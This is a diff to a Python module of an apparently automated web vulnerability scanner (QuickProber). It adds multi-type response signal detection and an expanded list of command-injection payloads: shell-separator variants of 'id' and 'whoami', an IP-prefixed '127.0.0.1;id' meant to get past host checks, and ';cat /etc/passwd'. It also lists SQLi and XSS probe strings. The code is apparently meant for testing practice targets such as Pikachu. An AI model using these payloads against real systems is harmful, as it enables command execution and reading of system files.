@@ -21,37 +21,11 @@ logger = logging.getLogger(__name__)
 # ──── L2-fix: SQL 错误特征库 (error-based / 闭合检测确认信号) ────
 # 旧 _classify/probe_round2 只看 长度差/5xx/时延, 漏掉 200+MySQL 报错这种
 # 最常见的 error-based SQLi (Pikachu POST id=1' → 200 + "error in your SQL syntax")
-_SQL_ERROR_PATTERNS = [
-    r"you have an error in your sql syntax",
-    r"error in your sql syntax",
-    r"syntax error near ['`\"]",
-    r"mysql_fetch",
-    r"warning:\s*mysql",
-    r"mysqli?",
-    r"valid mysql result",
-    r"odbc (sql|driver)",
-    r"ora-\d{5}",
-    r"pg_(query|exec|send_query)",
-    r"sqlstate",
-    r"sqlite3?\.",
-    r"unclosed quotation mark",
-    r"near ['`\"][^'\"]*['`\"]:\s*line",
-]
-
-
-def _detect_error_signal(body: str) -> str | None:
-    """检测响应体中的 DB 错误字符串, 返回命中的模式描述 (None=未命中)"""
-    if not body:
-        return None
-    lower = body.lower()
-    for pat in _SQL_ERROR_PATTERNS:
-        m = re.search(pat, lower)
-        if m:
-            # 提取上下文证据片段 (60 字符)
-            idx = m.start()
-            snippet = body[max(0, idx - 20): idx + 80].replace("\n", " ").strip()
-            return f"SQL_ERROR[{pat}]: ...{snippet}..."
-    return None
+# v2/L2-P2a: 委托给 signal_detector 多类型信号检测器 (覆盖 RCE/XSS/LFI/SSTI/SQLi)
+from app.agents.lats.signal_detector import (
+    detect_signals, has_promote_signal, detect_error_signal as _detect_error_signal,
+    SignalMatch,
+)
 
 
 @dataclass
@@ -106,6 +80,8 @@ _VULN_TYPE_PROBE_PAYLOAD: dict[str, str] = {
 }
 
 # P3: Round 2 多样 payload (不同注入技术)
+# v2/L2-P2b: RCE 载荷集扩展为 shell-metachar 矩阵 — 旧实现只有反引号/管道/$(id),
+# 但 Pikachu rce_ping 要求分隔符 ; | || & 且需合法 IP 前缀。
 _VULN_TYPE_DIVERSE_PAYLOADS: dict[str, list[str]] = {
     "sql_injection": [
         "'",                          # 闭合探测
@@ -113,9 +89,18 @@ _VULN_TYPE_DIVERSE_PAYLOADS: dict[str, list[str]] = {
         "-1 UNION SELECT 1,2,3--+",  # UNION 探测
     ],
     "rce": [
-        "`id`",                       # 反引号
-        "| sleep 3",                  # 管道 + 时间盲注
+        # v2/L2-P2b: shell-metachar 矩阵 — 覆盖 ; | || & && 分隔符
+        "; id",                       # 分号分隔 (Pikachu rce_ping 命中)
+        "| id",                       # 管道
+        "|| id",                      # 逻辑或
+        "& id",                       # 后台执行
+        "&& id",                      # 逻辑与
+        "; whoami",                   # whoami 输出
+        "`id`",                       # 反引号命令替换
         "$(id)",                      # 命令替换
+        "127.0.0.1;id",              # 合法 IP 前缀 + 分隔符 (绕过 host 校验)
+        ";cat /etc/passwd",           # 文件读取
+        "|cat /etc/passwd",           # 管道文件读取
     ],
     "xss": [
         "'-alert(1)-'",
@@ -153,6 +138,10 @@ _VULN_TYPE_DIVERSE_PAYLOADS: dict[str, list[str]] = {
         "javascript:alert(1)",
     ],
 }
+
+
+# v2/L2-P2b: host/IP 语义参数类 — 命中时载荷前缀自动加合法 IP
+_HOST_PARAM_KEYWORDS = ("ip", "ipaddress", "host", "addr", "ping", "target", "server")
 
 
 # ──── P1: 无参端点参数回退映射 ────
@@ -266,14 +255,22 @@ class QuickProber:
             if not probe.get("success"):
                 result.signals["probe_failed"] = True
 
-            # L2-fix: SQL 错误串检测 — probe_char (常用 '/') 触发 error-based 信号
+            # v2/L2-P2a: 多类型 SignalDetector 在每条响应上跑全类型扫描
+            # (治 R6: 旧 _detect_error_signal 只覆盖 SQLi, RCE uid= 被漏掉)
             probe_body = probe.get("body", "") or ""
+            probe_signals = detect_signals(probe_body, vuln_type)
+            if probe_signals:
+                result.signals["_signal_matches"] = probe_signals
+            # 向后兼容: SQL 错误串入口
             err = _detect_error_signal(probe_body)
             if err and vuln_type in ("sql_injection", "sql_injection_numeric", "xss", "ssti", "lfi"):
                 result.signals["sqli_error"] = err
 
             # Step 3: 代表性 payload
+            # v2/L2-P2b: host/IP 语义参数命中时, 载荷前缀加合法 IP
             probe_payload = _VULN_TYPE_PROBE_PAYLOAD.get(vuln_type, "test")
+            if probe_payload and vuln_type == "rce" and self._is_host_param(param):
+                probe_payload = f"127.0.0.1;id"
             if probe_payload:
                 inject = await self._send_request(endpoint, context, param=param, payload=probe_payload,
                                                   method=method, form_fields=form_fields)
@@ -282,9 +279,23 @@ class QuickProber:
                 result.inject_time_ms = inject.get("response_time_ms", 0)
                 result.signals["inject_body"] = inject.get("body", "") or ""
                 result.signals["baseline_body"] = baseline.get("body", "") or ""
-                # L2-fix: inject payload 也检测错误串
+                # v2/L2-P2a: inject payload 也跑 SignalDetector (含 payload 反射判定)
+                inj_body = inject.get("body", "") or ""
+                inj_signals = detect_signals(inj_body, vuln_type, payload_sent=probe_payload)
+                if inj_signals:
+                    # 合并到 _signal_matches (取 confidence 最高的)
+                    existing = result.signals.get("_signal_matches", [])
+                    merged: list[SignalMatch] = list(existing)
+                    for m in inj_signals:
+                        old = next((e for e in merged if e.vuln_type == m.vuln_type), None)
+                        if old is None:
+                            merged.append(m)
+                        elif m.confidence == "confirmed" and old.confidence != "confirmed":
+                            merged[merged.index(old)] = m
+                    result.signals["_signal_matches"] = merged
+                # 向后兼容: SQL 错误串
                 if "sqli_error" not in result.signals:
-                    err2 = _detect_error_signal(inject.get("body", "") or "")
+                    err2 = _detect_error_signal(inj_body)
                     if err2:
                         result.signals["sqli_error"] = err2
 
@@ -302,6 +313,9 @@ class QuickProber:
         """P3: 基于探测结果的三分类 + 两轮探测
 
         verdicts: promoted | needs_deeper_probe | killed | low_signal
+
+        v2/L2-P2a: 使用 signal_detector 多类型信号检测 (覆盖 RCE/XSS/LFI/SSTI/SQLi),
+        替代仅 SQLi 的 _detect_error_signal。
         """
         signals = r.signals
 
@@ -336,7 +350,25 @@ class QuickProber:
             if r.baseline_status == 200:
                 return "promoted"
 
+        # v2/L2-P2a: 多类型 SignalDetector — confirmed/strong 信号直接 promoted
+        # (治 R6: 旧实现仅 SQLi error 才 promote, RCE uid= 反射被当 no_signal 杀掉)
+        sig_matches: list[SignalMatch] = signals.get("_signal_matches", [])
+        if not sig_matches:
+            # 兜底: 现场重新扫描 inject_body
+            inj_body = signals.get("inject_body", "")
+            if inj_body:
+                sig_matches = detect_signals(inj_body, r.vuln_type)
+                signals["_signal_matches"] = sig_matches
+        if has_promote_signal(sig_matches):
+            # 记录命中的信号类型供诊断
+            for m in sig_matches:
+                if m.confidence in ("confirmed", "strong"):
+                    signals[f"signal_{m.vuln_type}"] = m.evidence
+                    break
+            return "promoted"
+
         # ── L2-fix: SQL 错误串 → 直接 promoted (error-based SQLi 确认信号) ──
+        # 向后兼容: 旧 signals["sqli_error"] 入口
         if signals.get("sqli_error"):
             return "promoted"
 
@@ -426,10 +458,16 @@ class QuickProber:
                 return result
 
             # P3: 使用 3 种不同 payload
+            # v2/L2-P2b: host/IP 参数命中时, 载荷前缀加合法 IP
             diverse_payloads = _VULN_TYPE_DIVERSE_PAYLOADS.get(vuln_type, ["test1", "test2", "test3"])
+            # host 参数优先用含合法 IP 前缀的载荷
+            if vuln_type == "rce" and self._is_host_param(param):
+                ip_payloads = [p for p in diverse_payloads if "127.0.0.1" in p or "id" in p.lower()]
+                if ip_payloads:
+                    diverse_payloads = ip_payloads + [p for p in diverse_payloads if p not in ip_payloads]
             had_signal = False
 
-            for payload in diverse_payloads[:3]:
+            for payload in diverse_payloads[:6]:  # v2: 扩大到 6 个载荷
                 if not payload:
                     continue
                 inject = await self._send_request(endpoint, context, param=param, payload=payload,
@@ -440,7 +478,17 @@ class QuickProber:
                 inj_body = inject.get("body", "") or ""
                 base_body = baseline.get("body", "") or ""
 
-                # L2-fix: SQL 错误串 — error-based SQLi 确认信号 (最高优先级)
+                # v2/L2-P2a: 多类型 SignalDetector — 优先级最高
+                sig_matches = detect_signals(inj_body, vuln_type, payload_sent=payload)
+                if has_promote_signal(sig_matches):
+                    result.signals["_signal_matches"] = sig_matches
+                    for m in sig_matches:
+                        if m.confidence in ("confirmed", "strong"):
+                            result.signals[f"signal_{m.vuln_type}"] = m.evidence
+                            break
+                    had_signal = True
+                    break
+                # 向后兼容: SQL 错误串
                 err = _detect_error_signal(inj_body)
                 if err:
                     result.signals["sqli_error"] = err
@@ -467,7 +515,7 @@ class QuickProber:
                 result.verdict = "promoted"
             else:
                 result.verdict = "killed"
-                result.error = "no_signal_after_6_probes"
+                result.error = "no_signal_after_probes"
 
         except Exception as e:
             result.verdict = "killed"
@@ -561,6 +609,13 @@ class QuickProber:
         method = str(meta.get("http_method", "GET")).upper()
         fields = list(meta.get("form_fields", []) or [])
         return method, fields
+
+    def _is_host_param(self, param: str | None) -> bool:
+        """v2/L2-P2b: 判断参数是否为 host/IP 语义类"""
+        if not param:
+            return False
+        p = param.lower()
+        return any(kw in p for kw in _HOST_PARAM_KEYWORDS)
 
 
 # ──── 批量探测器 ────
